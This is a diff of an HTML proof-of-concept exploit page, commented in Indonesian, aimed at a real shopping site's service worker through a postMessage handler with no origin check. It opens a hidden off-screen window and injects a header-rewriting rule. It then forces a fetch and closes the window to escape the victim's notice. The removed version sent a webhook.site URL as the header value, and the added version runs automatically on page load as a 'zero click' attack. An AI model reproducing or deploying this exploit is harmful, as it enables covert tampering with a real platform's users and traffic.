@@ -1,59 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PoC Audit Status</title>
-</head>
-<body style="background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
-    <h1>[ SYSTEM STATUS: READY ]</h1>
-    <p>Payload: X-PNS-Audit-Status Injection</p>
-    
-    <button onclick="runAttack()" style="padding: 15px 30px; cursor: pointer; font-weight: bold;">
-        EXECUTE SILENT INJECTION
-    </button>
-
+<head><title>Loading System...</title></head>
+<body>
     <script>
-        function runAttack() {
-            // 1. Membuka jendela ke target agar postMessage memiliki tujuan (targetWindow)
-            const targetWin = window.open("https://shop-id.tokopedia.com", "_blank", "width=10,height=10,left=-1000,top=-1000");
+        // Payload persis seperti yang sukses di console kemarin
+        const payload = {
+            source: "main_thread",
+            eventName: "network_rule",
+            data: [{
+                ruleName: "zero_click_pwn",
+                global: true,
+                conditions: [],
+                handlers: [{
+                    handler: "replace",
+                    type: "header",
+                    field: "X-Pns-Referrer", // Pakai header yang sudah ada di pns_logic agar tidak error 100000
+                    value: "VULNERABLE_ZERO_CLICK"
+                }]
+            }]
+        };
 
-            // 2. Memberikan waktu agar Service Worker di domain target termuat sepenuhnya
-            setTimeout(() => {
-                if (targetWin) {
-                    const payload = {
-                        source: "main_thread", // Harus sesuai dengan pengecekan di pns_logic.js
-                        eventName: "network_rule",
-                        data: [{
-                            ruleName: "audit_test",
-                            global: true,
-                            conditions: [],
-                            handlers: [{
-    handler: "replace",
-    type: "header",
-    field: "X-Pns-Referrer", // Menggunakan header yang sudah ada di pns_logic.js
-    value: "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"
-}]
+        // Otomatis jalan saat halaman di-load
+        window.onload = function() {
+            // Membuka window kecil secara otomatis
+            const pwn = window.open("https://shop-id.tokopedia.com/robots.txt", "_blank", "width=10,height=10,left=-1000,top=-1000");
 
-                        }]
-                    };
-
-                    // 3. Mengirim pesan ke jendela target tanpa memvalidasi origin
-                    targetWin.postMessage(payload, "*");
+            if (pwn) {
+                setTimeout(() => {
+                    // Mengirim pesan ke pns_logic.js tanpa origin check
+                    pwn.postMessage(payload, "*");
                     
-                    console.log("Injeksi berhasil dikirim ke Service Worker target.");
-
-                    // 4. Memicu Fetch Event secara otomatis dengan mengalihkan halaman (Zero-Click Trigger)
+                    // Memaksa fetch agar rule langsung aktif
                     setTimeout(() => {
-                        targetWin.location.href = "https://shop-id.tokopedia.com/robots.txt";
-                    }, 1000);
+                        pwn.location.href = "https://shop-id.tokopedia.com/robots.txt?t=" + Date.now();
+                    }, 500);
 
-                    // 5. Menutup jendela secara otomatis setelah injeksi selesai agar tidak terdeteksi korban
-                    setTimeout(() => {
-                        targetWin.close();
-                        alert("Attack Sent! Check your Network tab for X-PNS-Audit-Status header.");
-                    }, 2000);
-                }
-            }, 3000);
-        }
+                    // Tutup setelah injeksi selesai
+                    setTimeout(() => { pwn.close(); }, 2000);
+                }, 3000); 
+            } else {
+                document.body.innerHTML = "<h1>Please enable pop-ups for Zero-Click Demo</h1>";
+            }
+        };
     </script>
 </body>
 </html>
